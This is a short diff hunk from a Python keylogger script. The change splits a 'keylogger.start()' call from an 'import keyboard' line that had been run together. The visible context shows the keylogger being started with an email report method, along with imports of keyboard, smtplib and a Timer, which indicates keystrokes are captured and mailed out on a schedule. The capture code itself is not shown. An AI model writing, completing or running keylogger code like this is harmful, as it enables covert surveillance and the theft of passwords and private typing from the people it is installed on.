@@ -72,7 +72,8 @@ class Keylogger:
         keyboard.wait()
 if __name__ == "__main__":
     keylogger = Keylogger(interval=SEND_REPORT_EVERY,report_method="email")
-    keylogger.start()import keyboard
+    keylogger.start()
+import keyboard
 import smtplib
 from threading import Timer
 from datetime import datetime
